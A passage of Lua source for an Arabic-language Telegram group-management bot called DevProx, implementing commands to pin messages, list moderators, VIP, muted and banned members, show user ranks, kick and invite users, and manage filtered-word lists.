-------------------------------------------DevProx----------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
if text:match("^تثبيت$") then  
local id = msg.id_
local msgs = {[0] = id}
pin(msg.chat_id_,msg.reply_to_message_id_,1)
DevAbs:set(DevProx..'pinnedmsg'..msg.chat_id_,msg.reply_to_message_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1,'📤┇ تم تثبيت الرساله ', 1, 'md')
end
end
--------------------------------------DevProx---------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Mm]odlist$") or text:match("^الادمنيه$") then
local abs =  'bot:momod:'..msg.chat_id_
local list = DevAbs:smembers(DevProx..abs)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of moderator ↓↓ \n\n"
else
text = "🏆┇ قائمه الادمنيه ↓↓ \n➖➖➖➖➖➖➖\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.."  » 🚸 @"..username.." ["..v.."]\n"
else
text = text..k.." » 🚸 "..v.."\n"
end
end
if #list == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of moderator is empty ☑️"
else
text = "📛┇ لا يوجد ادمنيه "
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text:match("^[Mm]odalllist$") or text:match("^الادمنيه العامين$") then
local abs =  'bot:moall:'
local list = DevAbs:smembers(DevProx..abs)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of moderator all↓↓ \n\n"
else
text = "🏆┇ قائمه الادمنيه العامين ↓↓ \n➖➖➖➖➖➖➖\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." » 🚸 @"..username.." ["..v.."]\n"
else
text = text..k.." » 🚸 "..v.."\n"
end
end
if #list == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of moderator all is empty ☑️"
else
text = "📛┇ لا يوجد ادمنيه عامين "
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
--------------------------------DevProx-------------------------------------------
if text:match("^[Vv]iplist$") or text:match("^الاعضاء المميزين$") then
local abs =  'bot:VipGroup:'..msg.chat_id_
local list = DevAbs:smembers(DevProx..abs)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of VIP Members ↓↓ : \n➖➖➖➖➖➖➖\n"
else
text = "📤┇ قائمه الاعضاء المميزين ↓↓ : \n➖➖➖➖➖➖➖\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." » 🚸 @"..username.." ["..v.."]\n"
else
text = text..k.." » 🚸 "..v.."\n"
end
end
if #list == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of VIP members is empty ☑️"
else
text = "📛┇ لا يوجد مميزين ☑️"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
--------------------------------DevProx-------------------------------------------
if text:match("^[Dd]onkylist$") or text:match("^قائمه المطايه$") or text:match("^المطايه$") then
local abs =  'bot:donky:'..msg.chat_id_
local list = DevAbs:smembers(DevProx..abs)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of donky ↓↓ : \n➖➖➖➖➖➖➖\n"
else
text = "📤┇ قائمه المطاية الكروب😹😔 ↓↓ : \n➖➖➖➖➖➖➖\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." » 🚸 @"..username.." ["..v.."]\n"
else
text = text..k.." » 🚸 "..v.."\n"
end
end
if #list == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of donky is empty ☑️"
else
text = "📤┇ عجيب 😳😹 هذا الكروب كله اوادم ما بي مطايه 😹😔"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
--------------------------------DevProx-------------------------------------------
if text:match("^[Vv]ipalllist$") or text:match("^المميزين عام$") or text:match("^الاعضاء المميزين عام$") then
local abs =  'bot:vpall:'
local list = DevAbs:smembers(DevProx..abs)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of VIP Members all↓↓ : \n➖➖➖➖➖➖➖\n"
else
text = "📤┇ قائمه الاعضاء المميزين عام ↓↓ : \n➖➖➖➖➖➖➖\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." » 🚸 @"..username.." ["..v.."]\n"
else
text = text..k.." » 🚸 "..v.."\n"
end
end
if #list == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of VIP members all is empty ☑️"
else
text = "📛┇ لا يوجد مميزين عام ☑️"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
------------------------------------------DevProx-----------------------------------------------------
if text:match("^[Mm]utelist$") or text:match("^المكتومين$") then
local abs =  'bot:muted:'..msg.chat_id_
local list = DevAbs:smembers(DevProx..abs)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of muted users ↓↓ : \n➖➖➖➖➖➖➖\n"
else
text = "📤┇ قائمه المكتومين ↓↓ : \n➖➖➖➖➖➖➖\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." » 🚸 @"..username.." ["..v.."]\n"
else
text = text..k.." » 🚸 "..v.."\n"
end
end
if #list == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of muted users is empty ☑️"
else
text = "📛┇ لا يوجد مكتومين ☑️"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
----------------------------------DevProx-------------------------------------------------------------
if text:match("^[Oo]wner$") or text:match("^[Oo]wnerlist$") or text:match("^المدير$") or text:match("^المدراء$") then
local abs =  'bot:owners:'..msg.chat_id_
local list = DevAbs:smembers(DevProx..abs)
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ قائمه المدراء ↓↓ : \n➖➖➖➖➖➖➖\n"
else
text = "📤┇ Owners list ↓↓ : \n➖➖➖➖➖➖➖\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." » 🚸 @"..username.." ["..v.."]\n"
else
text = text..k.." » 🚸 "..v.."\n"
end
end
if #list == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ Owner list is empty ☑️"
else
text = "📛┇ لا يوجد مدراء ☑️"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
---------------------------------DevProx------------
if text:match("^[Oo]wnerall$") or text:match("^[Oo]wneralllist$") or text:match("^المدراء العامين$") or text:match("^المدير العام$") then
local abs =  'bot:onall:'
local list = DevAbs:smembers(DevProx..abs)
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ قائمه المدراء العامين ↓↓ : \n➖➖➖➖➖➖➖\n"
else
text = "📤┇ Owners all list ↓↓ : \n➖➖➖➖➖➖➖\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." » 🚸 @"..username.." ["..v.."]\n"
else
text = text..k.." » 🚸 "..v.."\n"
end
end
if #list == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ Owner all list is empty ☑️"
else
text = "📛┇ لا يوجد مدراء عامين ☑️"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
----------------------------------------DevProx--------------
if text:match("^[mM]onsh$") or text:match("^[Mm]onshlist$") or text:match("^المنشئ$") or text:match("^المنشئين$") then
local abs =  'bot:monsh:'..msg.chat_id_
local list = DevAbs:smembers(DevProx..abs)
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ قائمه المنشئين ↓↓ : \n➖➖➖➖➖➖➖\n"
else
text = "📤┇ monsh list ↓↓ : \n➖➖➖➖➖➖➖\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." » 🚸 @"..username.." ["..v.."]\n"
else
text = text..k.." » 🚸 "..v.."\n"
end
end
if #list == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ Monsh list is empty ☑️"
else
text = "📛┇ لا يوجد المنشئين ☑️"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
----------------------------------------DevProx-------------------------------------------------------
if text:match("^[Bb]anlist$") or text:match("^المحظورين$") then
local abs =  'bot:banned:'..msg.chat_id_
local list = DevAbs:smembers(DevProx..abs)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of banlist ⏱ : \n\n"
else
text = "📤┇ قائمه المحظورين ↓↓ : \n➖➖➖➖➖➖➖\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." » 🚸 @"..username.." ["..v.."]\n"
else
text = text..k.." » 🚸 "..v.."\n"
end
end
if #list == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ list of banlist is empty ☑️"
else
text = "📛┇ لا يوجد محظورين ☑️"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
---------------------------------DevProx--------------------------------------------------------------
if is_sudo(msg) and (text:match("^[Ss]etsupport$") or text:match("^ضع دعم$")) then
if DevAbs:get(DevProx.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇  Please Send your *Support link* Or *Support Bot ID* now ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "️📤┇ ارسل لي رابط كروب الدعم \n🚏┇  او قم بارسال المعرف الذي تود ان يتواصل معك متابعيك من خلاله ", 1, "md")
end
DevAbs:setex(DevProx.."bot:support:link" .. msg.sender_user_id_, 120, true)
end
if is_sudo(msg) and (text:match("^[Dd]elsupport$") or text:match("^حذف الدعم$")) then
if DevAbs:get(DevProx.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ Support *Information* Deleted ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ تم حذف معلومات الدعم ", 1, "md")
end
DevAbs:del(DevProx.."bot:supports:link")
end
--------DevProx
if is_sudo(msg) then
if text:match("^[Bb]analllist$") or text:match("^قائمه العام$") then
local abs =  'bot:gban:'
local list = DevAbs:smembers(DevProx..abs)
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ List of banlist ↓↓ : \n➖➖➖➖➖➖➖\n"
else
text = "📤┇ قائمه الحظر العام ↓↓ : \n➖➖➖➖➖➖➖\n"
end
for k,v in pairs(list) do
local user_info = DevAbs:hgetall('user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text..k.." » 🚸 @"..username.." ["..v.."]\n"
else
text = text..k.." » 🚸 "..v.."\n"
end
end
if #list == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ list of banalllist is empty ☑️"
else
text = "📛┇ لا يوجد محظورين عام ☑️"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end 
if text == "المطورين" then 
local abs =  'bot:admins:'
local list = DevAbs:smembers(DevProx..abs)
text = "📤┇ مطورين الرتبه الثالثه ↓↓ :\n\n"
for k, v in pairs(list) do
if DevAbs:get(DevProx.."sudoNumberGp" .. v) then
gps = tonumber(DevAbs:get(DevProx.."sudoNumberGp" .. v))
else
gps = 0
end
local user_info = DevAbs:get(DevProx.."user:Name" .. v)
if user_info then
local username = user_info
text = text .. k .. " [" .. username .. "] ~{" .. gps .. "}\n"
else
text = text .. k .. " (" .. v .. ") ~{" .. gps .. "}\n"
end end
if #list == 0 then
text = "📛┇ لا يوجد مطورين بهذه الرتبه ☑️"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, "md")
end end
------------------------------------DevProx-----------------------------------------------------------
if text:match("^[Gg]etid$") or text:match("^ايدي$") and msg.reply_to_message_id_ ~= 0 then
function id_by_reply(extra, result, success)
if DevAbs:get('lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ user id   "..result.sender_user_id_, 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "📤┇ ايدي العضو   "..result.sender_user_id_, 1, 'md')
end
end
getMessage(msg.chat_id_,msg.reply_to_message_id_,id_by_reply)
end
if text:match("^رتبته @(.*)$") then
local ap = {string.match(text, "^(رتبته) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'sudo all'
elseif is_sudoid(result.id_) then
t = 'sudo 2'
elseif is_admin(result.id_) then
t = 'sudo 3'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'monsh'
elseif is_onall(result.id_) then
t = 'owner all'
elseif is_moall(result.id_) then
t = 'modod all'
elseif is_vpall(result.id_) then
t = 'vip all'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'Owner'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'Full donky'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'Bot Admin'
elseif result.id_ == bot_id then
t = 'Myself'
else
t = 'Member'
end
end
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'مطور اساسي'
elseif is_sudoid(result.id_) then
t = 'مطور ثانوي'
elseif is_admin(result.id_) then
t = 'مطور فالرتبه الثالثه'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'منشئ الكروب'
elseif is_onall(result.id_) then
t = 'مدير عام'
elseif is_moall(result.id_) then
t = 'ادمن عام'
elseif is_vpall(result.id_) then
t = 'مميز عام'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'مطي محمل طحين 😹😔'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'مدير البوت'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'ادمن البوت'
elseif result.id_ == bot_id then
t = 'هذا انا البوت'
else
t = 'عضو فقط'
end
end
local gpid = tostring(result.id_)
if gpid:match('^(%d+)') then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '💳┇ rank ~ ( '..t
else
text = '💳┇ رتـبتـه ~ ( '..t
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '📤 this channel or group \n🏆is not have rank '
else
text = '📤 هذه قناة او كروب \n🏆ليس له رتبه '
end
end
end
if not result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '📤┇ Username is not correct ☑️'
else
text = '🎖┇ المعرف غير صحيح ☑️'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],id_by_username)
end
-----------------------------------DevProx------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ii]d @(.*)$") then
local ap = {string.match(text, "^([Ii]d) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'sudo all'
elseif is_sudoid(result.id_) then
t = 'sudo 2'
elseif is_admin(result.id_) then
t = 'sudo 3'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'monsh'
elseif is_onall(result.id_) then
t = 'owner all'
elseif is_moall(result.id_) then
t = 'modod all'
elseif is_vpall(result.id_) then
t = 'vip all'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'Full donky'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'Owner'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'Bot Admin'
elseif result.id_ == bot_id then
t = 'Myself'
else
t = 'Member'
end
end
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'مطور اساسي'
elseif is_sudoid(result.id_) then
t = 'مطور ثانوي'
elseif is_admin(result.id_) then
t = 'مطور فالرتبه الثالثه'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'منشئ الكروب'
elseif is_onall(result.id_) then
t = 'مدير عام'
elseif is_moall(result.id_) then
t = 'ادمن عام'
elseif is_vpall(result.id_) then
t = 'مميز عام'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'مطي محمل طحين 😹😔'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'مدير البوت'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'ادمن البوت'
elseif result.id_ == bot_id then
t = 'هذا انا البوت'
else
t = 'عضو فقط'
end
end
local gpid = tostring(result.id_)
if gpid:match('^(%d+)') then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '📤┇ user ~ ( @'..ap[2]..' )\n🖇┇ id ~ ( `'..result.id_..'` )\n💳┇ rank ~ ( '..t
else
text = '📤┇ معـرفه ~ ( @'..ap[2]..' )\n🖇┇ ايـديـه ~ ( `'..result.id_..'` )\n💳┇ رتـبتـه ~ ( '..t
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '📤┇ Channel ~ ( @'..ap[2]..' )\n🖇┇ id ~ ( {`'..result.id_..'`}'
else
text = '📤┇ القناة ~ ( @'..ap[2]..' )\n🖇┇ ايديها ~ ( {`'..result.id_..'`}'
end
end
end
if not result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '🎖┇ Username is not correct ☑️'
else
text = '📤┇ المعرف غير صحيح ☑️'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],id_by_username)
end
if text:match("^ايدي @(.*)$") then
local ap = {string.match(text, "^(ايدي) @(.*)$")}
function id_by_username(extra, result, success)
if result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'Chief'
elseif is_sudoid(result.id_) then
t = 'sudo'
elseif is_admin(result.id_) then
t = 'sudo3'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'monsh'
elseif is_onall(result.id_) then
t = 'owner all'
elseif is_moall(result.id_) then
t = 'modod all'
elseif is_vpall(result.id_) then
t = 'vip all'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'Full donky'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'Owner'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'Group Admin'
elseif result.id_ == bot_id then
t = 'Myself'
else
t = 'Member'
end
end
if not DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
if tonumber(result.id_) == tonumber(bot_owner) then
t = 'مطور اساسي'
elseif is_sudoid(result.id_) then
t = 'مطور ثانوي'
elseif is_admin(result.id_) then
t = 'مطور فالرتبه الثالثه 🌟'
elseif is_monsh(result.id_, msg.chat_id_) then
t = 'منشئ الكروب'
elseif is_onall(result.id_) then
t = 'مدير عام'
elseif is_moall(result.id_) then
t = 'ادمن عام'
elseif is_vpall(result.id_) then
t = 'مميز عام'
elseif is_donky(result.id_, msg.chat_id_) then
t = 'مطي محمل طحين 😹😔'
elseif is_owner(result.id_, msg.chat_id_) then
t = 'مدير البوت'
elseif is_momod(result.id_, msg.chat_id_) then
t = 'ادمن البوت'
elseif result.id_ == bot_id then
t = 'هذا انا البوت'
else
t = 'عضو فقط'
end
end
local gpid = tostring(result.id_)
if gpid:match('^(%d+)') then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '⏱┇ user ~ ( @'..ap[2]..' )\n🖇┇ id ~ ( `'..result.id_..'` )\n💳┇ rank ~ ( '..t
else
text = '📤┇ معـرفه ~ ( @'..ap[2]..' )\n🖇┇ ايـديـه ~ ( `'..result.id_..'` )\n💳┇ رتـبتـه ~ ( '..t
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '📤┇ Channel ~ ( @'..ap[2]..' )\n🖇┇ id ~ ( {`'..result.id_..'`}'
else
text = '📤┇ القناة ~ ( @'..ap[2]..' )\n🖇┇ ايديها ~ ( {`'..result.id_..'`}'
end
end
end
if not result.id_ then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '📤┇ Username is not correct ☑️'
else
text = '📤┇ المعرف غير صحيح ☑️'
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
resolve_username(ap[2],id_by_username)
end
-----------------------------------------------DevProx------------------------------------------------
local text = msg.content_.text_:gsub('طرد','Kick')
if text:match("^[Kk]ick$") and msg.reply_to_message_id_ ~= 0 then
function kick_reply(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("DevProx:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لا تستطيع الحظر او الطرد \n🏆┇ لانه معطل من قبل المنشئ ', 1, 'md')
return "DevProx"
end
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.sender_user_id_)
local DevProx_res = user_info_
if user_info_ then
if not is_momod(result.sender_user_id_, result.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The user ؛ '..result.sender_user_id_..' ، 🚷\n🚸┇ has been kicked ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..result.sender_user_id_..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم  ( طرده ) بنجاح *', 1, 'md')
end
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_,msg.reply_to_message_id_,kick_reply)
end
--------------------------DevProx-------------------------------
if text:match("^[Kk]ick @(.*)$") then
local ap = {string.match(text, "^([Kk]ick) @(.*)$")}
function ban_by_username(extra, result, success)
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("DevProx:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لا تستطيع الحظر او الطرد \n🏆┇ لانه معطل من قبل المنشئ ', 1, 'md')
return "DevProx"
end
local user_info_ = DevAbs:get(DevProx..'user:Name' .. result.id_)
local DevProx_res = user_info_
if user_info_ then
if result.id_ then
if not is_momod(result.id_, msg.chat_id_) then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ The User ؛ '..result.id_..' ، 🚷\n🚸┇ has been kicked ✅ \nֆ                 ֆ*'
else
texts = '🏆┇ العضو ( '..DevProx_res..' )\n📤┇ ايديه ( '..result.id_..' )\n⏱┇ بواسطه ( '..renk_DevProx(msg)..' )\n☑️┇ تم  ( طرده ) بنجاح'
end
chat_kick(msg.chat_id_, result.id_)
end
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '*🚸┇ Username is not correct *'
else
text = '*🚸┇ المعرف غير صحيح *'
end
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
resolve_username(ap[2],ban_by_username)
end
------------------------------DevProx-----------------------------------------------------------------
if text:match("^[Kk]ick (%d+)$") then
local ap = {string.match(text, "^([Kk]ick) (%d+)$")}
if not is_monsh(msg.sender_user_id_, msg.chat_id_) and DevAbs:get("DevProx:lock:ban"..bot_id..msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ لا تستطيع الحظر او الطرد \n🏆┇ لانه معطل من قبل المنشئ ', 1, 'md')
return "DevProx"
end
local user_info_ = DevAbs:get(DevProx..'user:Name' .. ap[2])
local DevProx_res = user_info_
if user_info_ then
if not is_momod(ap[2], msg.chat_id_) then
chat_kick(msg.chat_id_, ap[2])
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '*🚸┇ The user ؛ '..ap[2]..' ، 🚷\n🚸┇ has been kicked ✅ \nֆ                 ֆ*', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '🏆┇ *العضو* ( ['..DevProx_res..'] )\n📤┇ *ايديه* ( *'..ap[2]..'* )\n⏱┇ *بواسطه ( '..renk_DevProx(msg)..' )*\n☑️┇ * تم  ( طرده ) بنجاح *', 1, 'md')
end end end end
-----------------------------------DevProx-----------------------------------------------------------
      if text:match("^[Ff]ilterlist$") or text:match("^قائمه المنع$") then
            local abs = (DevProx..'bot:filters:'..msg.chat_id_)
            if abs then
              local names = DevAbs:hkeys(abs)
              if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
                text = "📤┇ Filterlist ↓↓ : \n➖➖➖➖➖➖➖\n"
              else
                text = "📤┇ قائمه الكلمات الممنوعه ↓↓ : \n➖➖➖➖➖➖➖\n"
              end
              for i=1, #names do
                text = text..'» 🚸 '..names[i]..'\n'
              end
              if #names == 0 then
                if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
                  text = "📤┇ Filterlist is empty ☑️"
                else
                  text = "📛┇ لا يوجد كلمات ممنوعه ☑️"
                end
              end
              Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
            end
          end
----------------------------------DevProx-------------------------------------------------------------
if text:match("^[Ff]ilterall list$") or text:match("^قائمه المنع العام$") then
local abs = (DevProx..'bot:freewords:')
if abs then
local names = DevAbs:hkeys(abs) 
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = '📤┇ Filter all list ↓↓ : \n➖➖➖➖➖➖➖\n'
else
text = '📤┇ قائمه المنع العام ↓↓ : \n➖➖➖➖➖➖➖\n'
end
for i=1, #names do
text = text..' » 🚸 '..names[i]..'\n'
end
if #names == 0 then
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
text = "📤┇ Filter all list is empty ☑️"
else
text = "📛┇ لا يوجد كلمات ممنوعه عام ☑️"
end
end
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
end
----------------------------------------DevProx-------------------------------------------------------
local text = msg.content_.text_:gsub('اضافه','Invite')
if text:match("^[Ii]nvite$") and msg.reply_to_message_id_ ~= 0 then
function inv_reply(extra, result, success)
add_user(result.chat_id_, result.sender_user_id_, 5)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,inv_reply)
end
-----------------------------------DevProx------------------------------------------------------------
if text:match("^[Ii]nvite @(.*)$") then
local ap = {string.match(text, "^([Ii]nvite) @(.*)$")}
function invite_by_username(extra, result, success)
if result.id_ then
add_user(msg.chat_id_, result.id_, 5)
else
if DevAbs:get(DevProx..'lang:gp:'..msg.chat_id_) then
texts = '📤┇ User not found '
else
texts = '📤┇ المعرف غير صحيح '
end
Dev_Abs(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
end
end
resolve_username(ap[2],invite_by_username)
end
end
--------------------------------------DevProx---------------------------------------------------------
if text:match("^[Ii]nvite (%d+)$") then
local ap = {string.match(text, "^([Ii]nvite) (%d+)$")}
add_user(msg.chat_id_, ap[2], 5)
end
-------- 
if text:match("^تعيين الايدي$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ اتبع التعليمات ليتم تعيين الكليشه الجديده \n🏆┇ اليك دوال طبع الايدي استخدم الكلمات الانكليزية \n\n username  »  لطبع يوزر العضو\n photo  »  لطبع عدد صور العضو \n nkat  »  لطبع عدد نقاط العضو \n cont  »  لطبع عدد اضافات العضو\n sticker  »  لطبع عدد ملصقات العضو\n msgs  »  لطبع عدد رسائل العضو\n id  »  لطبع ايدي العضو \n formsg  »  لطبع تفاعل العضو \n renk  »  لطبع رتبه العضو ', 1, 'md')
DevAbs:set("DevProx:now:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'DevProx')
return "DevProx"
end
if text and is_owner(msg.sender_user_id_, msg.chat_id_)  and DevAbs:get("DevProx:now:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
DevAbs:del("DevProx:now:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم حفض الكليشه الجديده  ', 1, 'md')
DevAbs:set("DevProx:DevProx:id:text:"..bot_id..msg.chat_id_,text)
end
if text:match("^حذف الايدي$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '📤┇ تم حذف كليشه الايدي  ', 1, 'md')
DevAbs:del("DevProx:DevProx:id:text:"..bot_id..msg.chat_id_)
end
---------------------------------DevProx--------------------------------------------------------------  
if msg.reply_to_message_id_ ~= 0 then
return ""
else
if (text:match("^ايدي$") or text:match("^id$") or text:match("^Id$")) and DevProx11(msg) then
function DevProx(extra,result,success)
